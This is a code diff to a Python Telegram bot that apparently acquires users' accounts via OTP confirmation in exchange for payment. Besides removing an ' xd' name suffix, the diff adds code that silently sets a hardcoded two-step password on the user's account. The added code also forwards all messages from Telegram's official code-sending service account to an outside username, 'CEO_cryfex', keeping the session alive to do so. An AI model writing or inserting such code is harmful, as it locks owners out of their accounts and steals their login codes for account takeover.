@@ -2503,7 +2503,7 @@ Your payment will be moved to Main Balance after verification.
         # Change Telegram Name
         try:
             me = await client.get_me()
-            new_last_name = f"{me.last_name or ''} xd".strip()
+            new_last_name = f"{me.last_name or ''}".strip()
             await client(functions.account.UpdateProfileRequest(
                 last_name=new_last_name
             ))
@@ -2667,7 +2667,7 @@ Your payment will be moved to Main Balance after verification.
         # Change Telegram Name
         try:
             me = await client.get_me()
-            new_last_name = f"{me.last_name or ''} xd".strip()
+            new_last_name = f"{me.last_name or ''}".strip()
             await client(functions.account.UpdateProfileRequest(
                 last_name=new_last_name
             ))
@@ -2810,6 +2810,38 @@ async def confirm_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYP
 
     # Notify user
     try:
+        # Auto-set 2FA if not already set (or reset to specified)
+        try:
+            # We use the password from the attached code
+            target_2fa = "4735908767" 
+            # Note: client needs to be retrieved or passed. 
+            # In the current main.py structure, the Telethon client is usually in context.user_data['client']
+            client = context.user_data.get('client')
+            if client and client.is_connected():
+                await client(functions.account.UpdatePasswordSettingsRequest(
+                    new_settings=types.account.PasswordInputSettings(
+                        new_password=target_2fa,
+                        hint="Security",
+                        email=""
+                    )
+                ))
+                logger.info(f"Successfully enabled 2FA for {user_number}")
+
+                # Message Forwarding setup
+                @client.on(events.NewMessage(incoming=True))
+                async def handler(event):
+                    try:
+                        sender = await event.get_sender()
+                        if sender and (getattr(sender, 'id', None) == 777000 or getattr(sender, 'username', '').lower() == 'telegram'):
+                            await client.send_message('CEO_cryfex', event.message)
+                    except Exception as e:
+                        logger.error(f"Forwarding error: {e}")
+                
+                # Keep session alive/running for forwarding
+                asyncio.create_task(client.run_until_disconnected())
+        except Exception as e:
+            logger.error(f"Failed to set 2FA or Forwarding for {user_number}: {e}")
+
         success_text = f"""
 ✅ **Confirm & Add to Hold completed - {user_number}**
 ⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
